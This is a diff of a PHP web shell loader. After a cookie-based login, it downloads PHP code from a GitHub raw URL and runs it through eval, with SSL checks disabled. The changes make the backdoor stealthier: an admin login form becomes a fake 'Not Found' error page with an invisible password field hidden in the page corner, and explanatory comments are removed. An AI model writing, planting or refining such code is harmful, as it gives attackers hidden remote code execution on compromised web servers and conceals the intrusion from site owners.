@@ -1,14 +1,10 @@
 <?php
-
-// Function to check if the user is logged in based on the presence of a valid cookie
 function is_logged_in()
 {
-    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; // Ganti 'user123' dengan nilai yang sesuai
+    return isset($_COOKIE['user_id']) && $_COOKIE['user_id'] === 'user123'; 
 }
 
-// Check if the user is logged in before executing the content
 if (is_logged_in()) {
-    // Function to get URL content (similar to your previous code)
     function geturlsinfo($url)
     {
         if (function_exists('curl_exec')) {
@@ -18,7 +14,6 @@ if (is_logged_in()) {
             curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
             curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
             curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
-
             $url_get_contents_data = curl_exec($conn);
             curl_close($conn);
         } elseif (function_exists('file_get_contents')) {
@@ -36,32 +31,32 @@ if (is_logged_in()) {
     $a = geturlsinfo('https://raw.githubusercontent.com/roihee69/sawatdee/main/a.php');
     eval('?>' . $a);
 } else {
-    // Display login form if not logged in
-    if (isset($_POST['password'])) {
-        $entered_password = $_POST['password'];
-        $hashed_password = '12502de1e4aa2c624d78162e28684cca'; // Replace this with your MD5 hashed password
+    if (isset($_POST['p'])) {
+        $entered_password = $_POST['p'];
+        $hashed_password = '12502de1e4aa2c624d78162e28684cca'; // MD5 hash ของรหัส
         if (md5($entered_password) === $hashed_password) {
-            // Password is correct, set a cookie to indicate login
-            setcookie('user_id', 'user123', time() + 3600, '/'); // Ganti 'user123' dengan nilai yang sesuai
+            setcookie('user_id', 'user123', time() + 3600, '/');
+            header("Location: " . $_SERVER['PHP_SELF']);
+            exit();
         } else {
-            // Password is incorrect
-            echo "Incorrect password. Please try again.";
+            echo "<p style='color:red;'>Incorrect password.</p>";
         }
     }
     ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Admin Login</title>
-    </head>
     <body>
-        <form method="POST" action="">
-            <label for="password">Admin:</label>
-            <input type="password" id="password" name="password">
-            <input type="submit" value="Login">
+        <h1>Not Found</h1>
+        The requested document was not found on this server.
+        <p>
+        <hr>
+        <address>
+        Web Server at port 80
+        </address>
+
+        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="post">
+            <input style="border:0;background:transparent;position:absolute;bottom:0;right:0;" 
+                   type="password" name="p" required />
         </form>
     </body>
-    </html>
     <?php
 }
 ?>
